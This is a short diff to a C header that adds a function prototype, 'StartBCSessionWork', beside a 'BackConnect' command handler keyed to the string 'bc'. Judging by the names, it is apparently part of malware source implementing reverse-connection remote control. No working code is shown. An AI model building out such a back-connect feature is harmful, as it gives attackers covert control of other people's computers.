@@ -11,6 +11,7 @@ const PCHAR CommandBackConnect = "bc\0";
 
 bool ExecuteBackConnectCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments);
 
+DWORD WINAPI StartBCSessionWork( LPVOID lpData );
 
 //----------------------------------------------------------------------------
 #endif
